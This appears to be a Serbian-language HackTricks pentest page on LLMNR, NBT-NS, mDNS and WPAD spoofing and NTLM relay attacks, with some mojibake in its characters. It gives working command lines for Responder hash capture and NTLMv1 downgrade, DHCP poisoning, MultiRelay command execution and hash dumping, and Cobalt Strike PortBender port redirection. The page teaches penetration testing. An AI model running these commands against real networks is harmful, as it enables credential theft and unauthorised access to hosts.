# Falsifikovanje LLMNR, NBT-NS, mDNS/DNS i WPAD i napadi preusmeravanja

{% hint style="success" %}
Nau캜ite i ve쬭ajte hakovanje AWS-a:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Obuka AWS Crveni Tim Stru캜njak (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Nau캜ite i ve쬭ajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Obuka GCP Crveni Tim Stru캜njak (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Mre쬹i protokoli

### Protokoli za lokalno re코avanje imena doma캖ina
- **LLMNR, NBT-NS i mDNS**:
- Microsoft i drugi operativni sistemi koriste LLMNR i NBT-NS za lokalno re코avanje imena kada DNS ne uspe. Sli캜no tome, Apple i Linux sistemi koriste mDNS.
- Ovi protokoli su podlo쬹i presretanju i falsifikovanju zbog njihove neautentifikovane, emitovane prirode preko UDP-a.
- [Responder](https://github.com/lgandx/Responder) se mo쬰 koristiti za predstavljanje usluga slanjem la쬹ih odgovora na hostove koji upituju ove protokole.
- Vi코e informacija o predstavljanju usluga kori코캖enjem Responder-a mo쬰te prona캖i [ovde](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Protokol za automatsko otkrivanje veb proxy-ja (WPAD)
- WPAD omogu캖ava pretra쬴va캜ima automatsko otkrivanje pode코avanja proxy servera.
- Otkrivanje se olak코ava putem DHCP-a, DNS-a, ili prelaskom na LLMNR i NBT-NS ako DNS ne uspe.
- Responder mo쬰 automatizovati napade WPAD-om, usmeravaju캖i klijente ka zlonamernim WPAD serverima.

### Responder za trovanje protokola
- **Responder** je alat koji se koristi za trovanje LLMNR, NBT-NS i mDNS upita, selektivno odgovaraju캖i na vrste upita, uglavnom ciljaju캖i SMB servise.
- Dolazi preinstaliran u Kali Linux-u, konfigurabilan na lokaciji `/etc/responder/Responder.conf`.
- Responder prikazuje uhva캖ene he코ove na ekranu i 캜uva ih u direktorijumu `/usr/share/responder/logs`.
- Podr쬬va IPv4 i IPv6.
- Windows verzija Responder-a je dostupna [ovde](https://github.com/lgandx/Responder-Windows).

#### Pokretanje Responder-a
- Za pokretanje Responder-a sa podrazumevanim pode코avanjima: `responder -I <Interfejs>`
- Za agresivnije sondiranje (sa potencijalnim sporednim efektima): `responder -I <Interfejs> -P -r -v`
- Tehnike za hvatanje NTLMv1 izazova/odgovora radi lak코eg de코ifrovanja: `responder -I <Interfejs> --lm --disable-ess`
- Impersonacija WPAD-a mo쬰 se aktivirati sa: `responder -I <Interfejs> --wpad`
- NetBIOS zahtevi mogu se re코iti ka IP adresi napada캜a, i mo쬰 se postaviti autentifikacioni proksi: `responder.py -I <interfejs> -Pv`

### Trovanje DHCP-a sa Responder-om
- Falsifikovanje DHCP odgovora mo쬰 trajno otrovati informacije o rutiranju rtve, nude캖i prikriveniju alternativu ARP trovanju.
- Zahteva precizno poznavanje konfiguracije ciljne mre쬰.
- Pokretanje napada: `./Responder.py -I eth0 -Pdv`
- Ovaj metod mo쬰 efikasno uhvatiti NTLMv1/2 he코ove, ali zahteva pa쬷jivo rukovanje kako bi se izbegla prekida mre쬰.

### Hvatanje akreditacija sa Responder-om
- Responder 캖e se predstavljati kao usluge koriste캖i pomenute protokole, hvataju캖i akreditacije (obi캜no NTLMv2 Izazov/Odgovor) kada korisnik poku코a da se autentifikuje protiv falsifikovanih usluga.
- Mogu se preduzeti poku코aji da se smanji na NetNTLMv1 ili onemogu캖i ESS radi lak코eg de코ifrovanja akreditacija.

Va쬹o je napomenuti da primena ovih tehnika treba da se obavlja legalno i eti캜ki, obezbe캠uju캖i odgovaraju캖u autorizaciju i izbegavaju캖i prekide ili neovla코캖en pristup.

## Inveigh

Inveigh je alat za testere penetracije i crvene timove, dizajniran za Windows sisteme. Nudi funkcionalnosti sli캜ne Responder-u, izvode캖i falsifikovanje i napade 캜oveka u sredini. Alat se razvio iz PowerShell skripte u C# binarni, sa [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) i [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) kao glavnim verzijama. Detaljni parametri i instrukcije mogu se prona캖i u [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh se mo쬰 koristiti putem PowerShell-a:
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Ili izvr코en kao C# binarni fajl:
```bash
Inveigh.exe
```
### NTLM Relay Napad

Ovaj napad koristi SMB autentikacione sesije kako bi pristupio ciljnom ra캜unaru, dodeljuju캖i sistemsku ljusku ako je uspe코an. Klju캜ni preduslovi uklju캜uju:
- Autentifikacioni korisnik mora imati lokalni Admin pristup na preusmerenom hostu.
- SMB potpisivanje treba da bude onemogu캖eno.

#### Preusmeravanje i tuneliranje porta 445

U scenarijima gde direktno umre쬬vanje nije izvodljivo, saobra캖aj na portu 445 treba preusmeriti i tunelirati. Alati poput [**PortBender**](https://github.com/praetorian-inc/PortBender) poma쬿 u preusmeravanju saobra캖aja sa porta 445 na drugi port, 코to je esencijalno kada je lokalni admin pristup dostupan za u캜itavanje drajvera.

Postavljanje i rad PortBender-a u Cobalt Strike-u:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Ostali alati za NTLM Relay napad

- **Metasploit**: Pode코en sa proxy-jem, lokalnim i udaljenim detaljima hosta.
- **smbrelayx**: Python skripta za preusmeravanje SMB sesija i izvr코avanje komandi ili implementaciju zadnjih vrata.
- **MultiRelay**: Alat iz Responder paketa za preusmeravanje odre캠enih korisnika ili svih korisnika, izvr코avanje komandi ili ispisivanje he코eva.

Svaki alat mo쬰 biti konfigurisan da radi preko SOCKS proxy-ja ako je potrebno, omogu캖avaju캖i napade 캜ak i sa indirektnim pristupom mre쬴.

### Rad MultiRelay-a

MultiRelay se pokre캖e iz _**/usr/share/responder/tools**_ direktorijuma, ciljaju캖i odre캠ene IP adrese ili korisnike.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
### Prisiljavanje NTLM prijava

U sistemu Windows **mo쬯a 캖ete mo캖i da prisilite neke privilegovane naloge da se autentifikuju na proizvoljnim ma코inama**. Pro캜itajte slede캖u stranicu da biste saznali kako:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## Reference
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


{% hint style="success" %}
Nau캜ite i ve쬭ajte hakovanje AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Nau캜ite i ve쬭ajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
